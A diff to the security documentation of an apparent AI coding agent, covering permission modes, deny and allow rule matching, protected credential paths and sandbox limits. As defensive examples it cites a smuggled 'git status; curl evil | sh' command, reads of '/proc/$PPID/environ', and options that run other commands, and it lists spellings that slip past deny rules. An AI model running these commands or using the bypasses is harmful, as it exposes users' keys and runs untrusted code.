@@ -19,7 +19,7 @@ permission gate (`/mode`).
 |---|---|
 | `default` | asks before every edit and every command that is not clearly read-only |
 | `accept-edits` | edits project files freely, still asks before commands |
-| `plan` | read-only: nothing is changed |
+| `plan` | read-only: nothing is changed, whatever an `allow` rule says |
 | `yolo` | asks for nothing. Only deny rules in `permissions.json` still hold |
 
 Switch with `shift+tab`, `/mode`, `/accept-edits` or `/yolo` (each toggles), or start
@@ -30,34 +30,60 @@ it is never a tool the model can call.
 running things you did not approve, but anything you approve runs with your
 permissions. In headless mode (`mnemo -p`) there is nobody to ask, so every
 call that would ask is **allowed**: it behaves like `yolo`, and only `deny`
-rules still apply. Run `-p`, `--yolo` and best-of (`--best-of`, `/bestof`) only
+rules and `--plan` still refuse. Run `-p`, `--yolo` and best-of (`--best-of`, `/bestof`) only
 in a place you can afford to lose: a container, a throwaway checkout.
 
 ### What the gate is, and is not
 
 - **`deny` rules are a filter, best effort.** A rule such as `env*` is tested
   against every command in a line, looking through spacing, `VAR=x` prefixes,
-  directories, `sudo`/`env` wrappers and `sh -c '…'`, and a deny beats every mode and
-  every `allow`. It does not understand every way to say the same thing
+  quotes and escapes (`"rm"`, `\rm`), directories, wrappers and their options
+  (`sudo -u root`, `env -u X`, `nice -n 5`, `timeout 5`, `nohup`, `eval`, `xargs`),
+  `find -exec`, and `sh -c '…'` with or without options before `-c`; for PowerShell
+  and on Windows without case or `.exe`. A deny beats every mode and every `allow`.
+  For file tools a rule is tested against the path as written and as it lands
+  (relative to the project, and absolute), so `.env*` also covers `./.env`, `@.env`
+  and `file:///…/.env`. It does not understand every way to say the same thing
   (`printenv`, `cat /proc/self/environ`, `python -c`, a script that was written
   first), and it does not reach into the Python tool (`ipy_run`). Deny what you
   mind, not just one spelling of it, and use `default` mode when it matters.
 - **`allow` rules and "always" grants end on a word and never cover a compound
-  command.** `git status*` does not cover `git status; curl evil | sh`, and an
-  approval of `rm -rf dist` covers exactly that command.
+  command.** `git status*` does not cover `git statusx` or `git status; curl evil | sh`,
+  and an approval of `rm -rf dist` covers exactly that command. A path `allow` is
+  matched only where the path lands, so `src/*` does not cover `src/../../etc/x`.
+  Subcommands that run their operand (`go run main.go`, `npm run build`, `bun x`,
+  `pnpm dlx`) are approved exactly, never as `go run*`, and a wildcard grant does
+  not cover an option that runs or writes something else (`git grep -O<cmd>`,
+  `git log --output=…`, `make -f`/`-C`/`--eval`, `-c`, `--exec`, `--config`,
+  `--upload-pack`) or any command that mentions `/proc`.
 - **`accept-edits` means edits inside this project.** Paths are resolved the way the
-  tools resolve them (`~`, `@`, `file://`, symlinks). `.git`, `.pi`, `.agents`,
-  `.mnemo`, `.github` and similar still ask, because what is written there runs
-  later. Skills are always asked about.
+  tools and the system resolve them (`~`, `@`, `file://`, unicode spaces, symlinks
+  including ones that point at a file that does not exist yet; on Windows `~\`,
+  `/c/…` and `/mnt/c/…`, trailing dots and spaces, `:streams` and case). `.git`,
+  `.githooks`, `.husky`, `.pi`, `.agents`, `.mnemo`, `.github`, `.claude`, `.vscode`,
+  `.idea` and `.devcontainer` still ask at any depth (`vendor/x/.git/hooks` too),
+  because what is written there runs later, and so do shell dotfiles, `.ssh`,
+  `.config` and `.local` in your home folder. Skills are always asked about.
 - **Reads are free, except credentials.** `read`, `grep`, `find` and `ls` never ask,
-  but refuse Mnemo's own `auth.json`, `~/.ssh`, `~/.aws` and `~/.gnupg`. A shell
-  command can still `cat` them if you approve it.
+  but refuse Mnemo's own `auth.json`, `models.json`, `grants.json` and `.env`,
+  `~/.ssh`, `~/.aws`, `~/.gnupg`, and a process's `/proc/<pid>/environ` and `mem`
+  (where the provider keys are). `grep` also refuses a folder that holds any of
+  them (`~`, `$MNEMO_HOME`, `/`), since it searches hidden files; search a folder
+  below it. An `allow` rule can open any of these. A shell command can still `cat`
+  them, or `cat /proc/$PPID/environ`: in `default` mode that asks, and no "always"
+  grant covers a command that mentions `/proc`, but **in `yolo` and `-p` it runs**
+  unless a `deny` rule stops it.
 - **A folder's own `.pi/` extensions, settings, prompts and skills run code and
   steer the model**, so Mnemo loads them only for a folder you have trusted: it asks
   once at start-up (`a` remembers it), headless runs skip them unless you pass
   `--trust-project`. Do not trust a repository you have not read.
-- A `permissions.json` that exists but cannot be parsed stops all edits and
-  commands until it is fixed, rather than quietly dropping your deny rules.
+- A `permissions.json` that exists but cannot be parsed (or holds `null`, a number,
+  `{"rules": null}`) stops all edits and commands until it is fixed, rather than
+  quietly dropping your deny rules. A malformed `grants.json` is read as no grants.
+  If the gate itself fails to start or to judge a call, that call is refused: the
+  gate fails closed, never open.
+- **A sub-agent follows the mode you pick while it runs**: switching to `plan`
+  reaches children that are already working.
 
 ## What leaves your machine
 
@@ -93,7 +119,8 @@ in a place you can afford to lose: a container, a throwaway checkout.
   choose that provider by default. If you do not want that, unset them for
   the session.
 - **Commands the agent runs do not get the model-provider keys.** The bash
-  tool, the Python kernel and best-of checks start with your environment minus
+  tool, the Python kernel and best-of checks (stopped with everything they started
+  when they overrun) start with your environment minus
   every key pi reads for a model provider (`ANTHROPIC_API_KEY`,
   `OPENAI_API_KEY`, `OPENCODE_API_KEY`, `AWS_BEARER_TOKEN_BEDROCK`, … — the
   list is `app/src/runtime/env.ts`) and any variable a custom provider in
@@ -108,8 +135,10 @@ in a place you can afford to lose: a container, a throwaway checkout.
   `curl`/`wget` to unknown hosts in `permissions.json`.
 - **The Python kernel is an interpreter, not a sandbox.** Each cell is stopped
   after 120 seconds (the model may ask for up to 600), stopping a turn stops the
-  cell, and on Linux its memory is capped at 8 GB (`MNEMO_KERNEL_MEMORY_MB`, `0`
-  for no cap). It can read and write what you can.
+  cell together with the processes it started (the kernel runs in its own process
+  group), and a tool call or approval the cell was waiting on is cancelled with it.
+  On Linux its memory is capped at 8 GB (`MNEMO_KERNEL_MEMORY_MB`, `0` for no cap;
+  a value that is not a whole number keeps 8 GB). It can read and write what you can.
 - Memory writes and session ingestion are redacted for common credential
   shapes (`sk-…`, `ghp_…`, `AKIA…`, private keys, and similar) before they are
   stored. Redaction is pattern-based and best effort: do not rely on it. Eval
